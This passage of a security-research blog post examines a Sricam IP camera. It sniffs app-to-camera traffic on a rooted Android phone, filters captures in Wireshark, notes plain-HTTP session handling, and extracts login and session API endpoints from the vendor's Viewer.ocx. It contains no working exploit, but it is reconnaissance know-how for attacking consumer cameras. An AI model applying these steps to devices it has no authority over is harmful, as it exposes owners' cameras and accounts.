	&amp;lt;/SOAP-ENV:Body&amp;gt;
  &amp;lt;/SOAP-ENV:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I tried a lot of different ones and it will result in errors like “Method not implemented” as I don’t know the used methods.
I don’t know how to craft the headers for the methods as I don’t have much knowledge about SOAP API’s and it seems to be not the easiest API especially when not knowing the used methods.&lt;/p&gt;

&lt;p&gt;There was released a quite fresh Exploit “Devil’s Ivy” of the service gSoap in several versions. This will be handled in a extra gistfile: https://gist.github.com/herrfeder/883093ae93eaefba8950c00f6a6bbed8#file-sricam_upnp_npc-md
http://blog.senr.io/devilsivy.html&lt;/p&gt;

&lt;h3 id=&quot;33-external-communication&quot;&gt;3.3 External Communication&lt;/h3&gt;

&lt;p&gt;As I suspect an encrypted connection between IPCam, Smartphone and Backend Server, we need to sniff directly on the IPCam or the smartphone. I guess, it’s much easier to setup raw sniffing on a rooted Android powered mobile phone.
The rooting is necessary for sniffing raw traffic on the network.
I downloaded tcpdump for Android (http://www.androidtcpdump.com/) and load it onto the phone.
For placing and executing an external binary are only a few places appropriate in the android file system.
You can use /data/local/tmp or /sdcard/tmp or maybe some other.
With adb we can control our Phone now.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb shell		&lt;span class=&quot;c&quot;&gt;#opening shell on android phone&lt;/span&gt;
shell@mako:/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su
root@mako:/data/local/tmp &lt;span class=&quot;c&quot;&gt;# ./tcpdump -n -s 0 -w ipcam_cap                   &lt;/span&gt;
tcpdump: listening on wlan0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
^C16598 packets captured
16598 packets received by filter
0 packets dropped by kernel
root@mako:/data/local/tmp &lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
hexdump.bin
ipcam_cap
tcpdump
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;331-communication-between-mobile-phone-and-ipcam&quot;&gt;3.3.1 Communication between Mobile Phone and IPCam&lt;/h4&gt;

&lt;p&gt;I was trying to trigger many activities in the communication between App and IPCam to get interesting traffic.
There was some interesting traffic. In following screenshots the App activity screenshots will be paired with screenshots of interesting packets.
To filter all the Android and Google Stuff it’s useful to filter some IP’s. I use wireshark for this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/smartphone_10.0.0.27_ipcam_10.0.0.21.cap&quot;&gt;Communication Smartphone IPCam&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;not ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 172.217.22.99 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; not ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 216.58.205.0/24 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 10.0.0.0/24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/OQz4e8X.png&quot; title=&quot;Register Screenshot 1&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/OQz4e8X.png&quot; alt=&quot;Register Screenshot 1&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Register Screenshot 1&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/0H2RkYn.png&quot; title=&quot;Register Screenshot 2&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/0H2RkYn.jpg&quot; alt=&quot;Register Screenshot 2&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Register Screenshot 2&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/4nQNNgK.png&quot; title=&quot;Login Check&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/4nQNNgK.png&quot; alt=&quot;Login Check&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Login Check&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/ldewdMA.png&quot; title=&quot;Answer for existing login&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/ldewdMA.png&quot; alt=&quot;Answer for existing login&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Answer for existing login&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/OPrbLyR.png&quot; title=&quot;Add Friend / Add camera to personal dash&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/OPrbLyR.png&quot; alt=&quot;Add Friend / Add camera to personal dash&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Add Friend / Add camera to personal dash&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/YDGSJ34.png&quot; title=&quot;After adding =&amp;gt; Get friends list&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/YDGSJ34.png&quot; alt=&quot;After adding =&amp;gt; Get friends list&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;After adding =&amp;gt; Get friends list&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/ldewdMA.png&quot; title=&quot;Answer for existing login&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/ldewdMA.png&quot; alt=&quot;Answer for existing login&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Answer for existing login&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/zybnO0G.png&quot; title=&quot;Add friend capture&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/zybnO0G.png&quot; alt=&quot;Add friend capture&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Add friend capture&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/ldewdMA.png&quot; title=&quot;Reply for existing login&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/ldewdMA.png&quot; alt=&quot;Reply for existing login&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Reply for existing login&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/Ixswo9z.png&quot; title=&quot;Get friends list&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/Ixswo9z.png&quot; alt=&quot;Get friends list&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Get friends list&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/8I54Wvk.png&quot; title=&quot;Delete friend&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/8I54Wvk.png&quot; alt=&quot;Delete friend&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Delete friend&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/jF4HlyL.png&quot; title=&quot;Get Version&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/jF4HlyL.png&quot; alt=&quot;Get Version&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Get Version&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/O9da1vS.png&quot; title=&quot;Reply for version&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/O9da1vS.png&quot; alt=&quot;Reply for version&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Reply for version&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;The first bad intention of the security architecture is using only plain HTTP communication. They are “secured” by a Session ID and some kind of encryption in the payloads.&lt;/p&gt;

&lt;h4 id=&quot;332-firmware-update&quot;&gt;3.3.2 Firmware Update&lt;/h4&gt;

&lt;p&gt;The app delivers the possibility of doing a firmware update of the IPCam. Of course, I captured this:
&lt;a href=&quot;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/firmware_upgrade.cap&quot;&gt;Firmware Upgrade&lt;/a&gt;
But there isn’t any obvious activity in the file, that would point out a firmware upgrade. Only many udp traffic between smartphone and IPCam. Following this UDP stream over the whole capture:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...~E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...~E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......	...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......
...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......!...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ....... ...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......!...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;s2&quot;&gt;&quot;...&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;....E.k.... ...........&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;....E.k.... ....... ...&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......!...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;....E.k.... .......&quot;&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .........dm..&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......+...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......,...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......-...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ......./...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......0...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......1...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......2...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......3...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......+...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......,...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......-...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ......./...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......0...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......1...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......2...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......3...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......+...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......,...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......-...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ......./...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......0...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......1...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......2...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......3...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......6...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......6...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......6...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......7...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......5...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......6...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......7...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......8...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......N...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......I...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......J...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......K...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......L...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......M...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......N...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......O...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......J...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......K...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......L...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......M...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......N...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......O...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......J...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......K...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......L...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......M...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......N...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......O...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......P...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......Q...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......Q...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......R...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......Q...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......R...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......S...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......S...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......T...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......T...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......U...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......U...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......U...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......V...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......U...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......V...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......W...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......W...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......W...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......em..&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;E.k............4...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...~E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;...~E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... ...........&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......	...&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;....E.k.... .......

As the file is to small &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;including a firmware stream and examining this repeatedly structure something has to went wrong on capturing the firmware upgrade.


&lt;span class=&quot;c&quot;&gt;### 3.3.3 Remote Website for accessing IPCam via Internet&lt;/span&gt;

Applying more filter to see communication between Laptop and the remote feature on videoipcamera.cn/view. Requires Internet Explorer to use it. There is a lot of traffic with three participants, so I have to use multiple rules and append only the file with the already filtered packets:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Communication AP Laptop prefiltered]&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/access_point_cap_laptop_10.0.1.36_website_101.1.17.22_filtered.cap&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;bash
not ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 172.217.22.99 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; not ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 216.58.205.234 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 101.1.17.22 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ip.addr &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 10.0.1.36 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; http.request
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will reveal a lot of GET requests to videoipcamera.cn and a binary setup.exe on http://videoipcamera.cn/view/setup.exe.
This is necessary to use the cam-client on a PC. By the way, installing and starting it on Windows 10 and Windows 7 Internet Explorer will kill Internet Explorer.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/UqKd2is.png&quot; title=&quot;Login for the web app&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/UqKd2is.png&quot; alt=&quot;Login for the web app&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Login for the web app&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/BC6Aclr.png&quot; title=&quot;Internet Explorer crashes on login attempt&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/BC6Aclr.png&quot; alt=&quot;Internet Explorer crashes on login attempt&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Internet Explorer crashes on login attempt&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;It will install some files into the directory C:Programme/Viewer_IPCam(SDL2.dll,Viewer.ocx).
SDL2.dll won’t reveal anything interesting with a short look in IDA Disassembler:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/bpIRtZs.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewer.ocx has some interesting strings in it that will reveal some new type of requests to the server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Ch1FEOt.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Put that into a list with the new info:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Viewer  1   327681  -1  39  /   
http:// DomainList  500 404 29  23  &amp;amp;Language=  &amp;amp;AppName=   &amp;amp;AppOS= &amp;amp;AppOS  &amp;amp;AppVersion=    &amp;amp;AppVersion 
Users/LoginCheck.ashx   &amp;amp;DomainList=    &amp;amp;Pwd=   VersionFlag=1&amp;amp;User= 
Users/Logout.ashx   &amp;amp;SessionID= UserID= 
